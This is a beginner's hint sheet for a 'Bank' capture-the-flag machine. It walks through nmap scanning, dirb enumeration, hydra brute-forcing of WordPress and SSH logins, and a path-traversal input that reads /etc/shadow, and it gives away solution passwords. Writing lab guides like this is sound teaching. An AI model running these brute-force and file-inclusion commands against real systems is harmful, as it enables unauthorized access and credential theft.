# BANK CTF Hints for beginners 

## _By Jacvbtaylor_


**HINT 1** 
Run an nmap scan on your network to find the Bank’s IP. Run ifconfig to find your ip range. Note: NMAP may take a while to finish

**HINT 2**  
Run this command and replace “ip” with the ip range on your network:
``nmap -sn -v ip/24   ``
example- if my ifconfig scan outputs my ip as 10.0.0.12 then I will run nmap -sn -v 10.0.0.0/24 
You can run this whole command to ONLY output the hosts that are up and put those IP’s into a text file. The script will then use that text file to do an extensive scan on those IP’s it found to be up to find what services/ports are running and open. 
``nmap -sn -v 10.0.0.0/24 -oG - | awk '/Up$/{print $2}' >> nmap.txt && nmap -v -iL nmap.txt``

**HINT 3** 
visit the target IP in your browser . Make sure your URL doesn’t change to https


**HINT 4**
view the source code of the page

**HINT 5**
Did you notice the page the button goes to? Maybe we can get to it manually

**HINT 6**
find list and run ``wget http://<ip>/robots.txt`` just make sure to replace the IP with the one you discovered


**HINT 7**
run command as ``dirb http://<ip>/`` and keep an eye out for ⇒ flags. This means it
found a valid webpage/directory 

**HINT 8** 
You should have found a wordpress directory from your dirb attack. Visit that page and find the first flag. Keep track of special information, like names so you can social engineer. 


**HINT 9**
Do you think patrick has an account on the wordpress site? 

**HINT 10**
Remember that list you found earlier? Let’s use it 

**HINT 11** 
Here is the syntax you should use for your bruteforce attack. Be sure to replace the IP address with your target’s IP.
``hydra -l patrick -P robots.txt 10.0.0.181 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR' -vV -t 30``

**HINT 12** 
Patrick can’t do too much to the site. Find another account with more privileges. 

**HINT 13** 
Reference flag one for a clue to who the admin may be

**HINT 14**
``hydra -l manager -P robots.txt 10.0.0.181 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR' -vV -t 30``


**HINT15** 
take your ASCII code and decipher it 

**HINT 16**
decode it here https://www.duplichecker.com/ascii-to-text.php


**HINT 17**
Save your decoded list as list.txt 

**HINT 18** 
you should have found port 22 or SSH open

**HINT 19**
try this command ``hydra -L list.txt -P list.txt ssh://10.0.0.181 -v -F -t 15``

**HINT 20** 
run ``ssh user@<ip> <port>``

**HINT 21** 
you should have found a user and password with the same name

**HINT 22** 
user/pass is cat 

**HINT 23** 
start with field 3. See if you can get the script to show something it’s not supposed to.

**HINT 24** 
try running ``6 AM ../../../../ Roulette`` What are the errors telling you?

**HINT 25** 
This looks like a Local File Inclusion exploit. What else can you see that you shouldn’t be able to? 

**HINT 26** 
you can change any field except field 4. Try looking at the /etc/shadow file using the script 

**HINT 27** 
look at the format of a shadow file and look for 2 characters all of the lines have using this URL https://www.cyberciti.biz/faq/understanding-etcshadow-file/ 


**HINT 28** 
try this ``x : /etc/shadow BlackJack``

**HINT 29** 
look for root’s message to Cat

**HINT 30** 
Try using crunch real quick. Run ``crunch 1 2 be`` to help you understand how it works. You can add different numbers and letters but be careful! Big numbers will make a huge list. 

**HINT 31**
You can google the riddle for the answer. It should be an 8 letter word. 

**HINT 32** 
``crunch 1 6 prisoner``

**HINT 33** 
password is 137256 
BUT maybe try a privilege escalation instead
